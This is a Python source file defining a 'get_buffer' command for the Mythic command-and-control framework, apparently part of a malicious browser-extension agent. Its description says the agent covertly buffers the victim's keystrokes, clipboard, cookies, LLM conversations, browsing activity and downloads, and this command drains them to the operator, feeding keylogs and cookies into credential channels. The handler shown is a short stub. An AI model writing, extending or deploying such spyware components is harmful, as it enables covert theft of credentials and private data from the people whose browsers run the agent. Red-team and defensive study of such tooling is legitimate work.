from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class GetBufferArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = []

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class GetBufferCommand(CommandBase):
    cmd = "get_buffer"
    needs_admin = False
    help_cmd = "get_buffer"
    description = (
        "Flush and return everything the agent has buffered locally while the "
        "operator was away: keylogs, clipboard, cookies, LLM conversations, "
        "browsing activity and download events. Each passive listener stores "
        "into chrome.storage.local; this command drains all of it at once."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = []
    argument_class = GetBufferArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=True,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        # Nothing to resolve server-side: the agent drains its local buffers and
        # maps keylogs/cookies onto Mythic's native keylog/credential channels.
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
